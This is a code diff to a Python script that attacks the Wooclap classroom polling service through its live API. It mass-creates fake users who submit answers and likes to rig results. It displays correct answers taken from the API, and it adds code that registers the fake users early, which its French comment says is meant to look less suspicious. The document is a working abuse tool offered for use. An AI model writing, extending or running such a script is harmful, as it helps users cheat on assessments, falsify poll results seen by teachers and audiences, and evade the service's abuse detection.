@@ -31,14 +31,14 @@ def attack_mcq_question(question, users, questionType):
     choices = []
     print(f"______{questionType}______\n\nQuestion: {question['title']}")
     for i, choice in enumerate(question['choices'], start=1):
-        print(f"[{i}] {choice['choice']}" + ("[Correct: {choice['isCorrect']}]" if questionType == "MCQ" else ""))
+        print(f"[{i}] {choice['choice']}" + (f" [Correct: {choice['isCorrect']}]" if questionType == "MCQ" else ""))
 
     if question['multipleChoice']:
         print("\nThis is a multiple-choice question. To select several answers, answer like this: '0+2'.")
-        answer = input("Which answer(s) do you want to respond?  ('-1' return to the menu)\n> ").split('+')
+        answer = input("Which answer(s) do you want to respond?  ('-1' return to the menu)\n> ").replace(" ","").split('+')
         choices = [question['choices'][int(r)-1]['_id'] for r in answer]
     else:
-        answer = input("Which answer do you want to respond?  ('-1' return to the menu)\n> ")
+        answer = input("Which answer do you want to respond?  ('-1' return to the menu)\n> ").strip()
         choices = [question['choices'][int(answer)-1]['_id']]
     if answer == "-1": # Donne l'occasion à l'utilisateur de revenir au menu
         return
@@ -48,14 +48,14 @@ def attack_mcq_question(question, users, questionType):
     for i in range(spam_number):
         headers = get_wooclap_headers(users[i])
         json_data = {'choices': choices, 'comment': '', 'token': f'z{users[i]}'}
-        response = requests.post(f'https://app.wooclap.com/api/questions/{question["_id"]}/push_answer', headers=headers, json=json_data)
+        requests.post(f'https://app.wooclap.com/api/questions/{question["_id"]}/push_answer', headers=headers, json=json_data)
 
 def attack_open_question(question, users):
     headers = get_wooclap_headers(users[0])
     print(f"______Open question______\n\nTitle: {question['title']}")
     if question['allExpectedAnswers']:
         print(f"Expected answers: {question['allExpectedAnswers']}")
-    answer = input("What do you want to answer? ('-1' return to the menu)\n> ")
+    answer = input("What do you want to answer? ('-1' return to the menu)\n> ").strip()
     if answer == "-1": # Donne l'occasion à l'utilisateur de revenir au menu
         return
 
@@ -73,7 +73,7 @@ def attack_open_question(question, users):
     answer_response = answer_response.json()
 
     if question['canLike']:
-        number_of_likes = min(int(input(f"How many likes do you want to your answer? (max: {len(users)})\n> ")), len(users))
+        number_of_likes = min(int(input(f"How many likes do you want to your answer? (max: {len(users)})\n> ").strip()), len(users))
         for i in range(number_of_likes):
             headers = get_wooclap_headers(users[i])
             json_data = {'toggle': True}
@@ -83,6 +83,14 @@ number_of_users = int(input("How many users do you want to create?\n> "))
 list_of_users = generate_users(number_of_users)
 
 event_code = input("What is the event code of the Wooclap?\n> ")
+
+os.system('cls||clear')
+print("######################################")
+print("###### CREATING THE USERS ############")
+print("######################################")
+
+for user in list_of_users: # Augmente le nombre d'utilisateurs dés leur initialisation pour paraitre moins suspect
+    response = requests.post(f"https://app.wooclap.com/api/user?slug={event_code}", headers=get_wooclap_headers(user))
 
 max_user = False
 
@@ -95,11 +103,15 @@ while True:
     print("[2] Add new users (Current: {})".format(len(list_of_users)))
     print("[3] Change the event code (Current: {})".format(event_code))
     print("[4] EXIT")
-    choice = int(input("> "))
+    choice = int(input("> ").strip())
 
     if choice == 2:
-        add_numb = int(input("How many users do you want to add?\n> "))
+        add_numb = int(input("How many users do you want to add?\n> ").strip())
         list_of_users = add_users(list_of_users, add_numb)
+        len_list_users = len(list_of_users)
+
+        for i in range(len_list_users - add_numb, len_list_users): # Augmente le nombre d'utilisateurs dés leur initialisation pour paraitre moins suspect
+            response = requests.post(f"https://app.wooclap.com/api/user?slug={event_code}", headers=get_wooclap_headers(list_of_users[i]))
         continue
     elif choice == 3:
         event_code = input("What is the event code of the Wooclap?\n> ")
